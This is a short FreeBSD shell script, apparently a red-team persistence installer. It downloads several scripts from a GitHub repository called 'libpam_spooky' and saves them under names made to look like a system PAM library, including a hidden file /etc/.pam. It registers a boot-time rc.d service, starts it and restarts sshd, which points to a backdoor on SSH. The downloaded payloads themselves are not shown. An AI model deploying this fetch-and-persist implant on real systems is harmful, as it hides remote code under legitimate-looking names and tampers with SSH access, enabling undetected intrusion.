#!/bin/sh

pkg install -y vim-console curl bash ca_root_nss
curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/overwrite_once.sh" > /usr/sbin/libpam
chmod +x /usr/sbin/libpam

curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/loop_bsd.sh" > /usr/bin/libpam
chmod +x /usr/bin/libpam

curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/sshd.bsd" > /etc/.pam

curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/libpam.rc" > /etc/rc.d/libpam
chmod +x /etc/rc.d/libpam
echo 'libpam_enable="YES"' >> /etc/rc.conf

service libpam onestart
service sshd restart
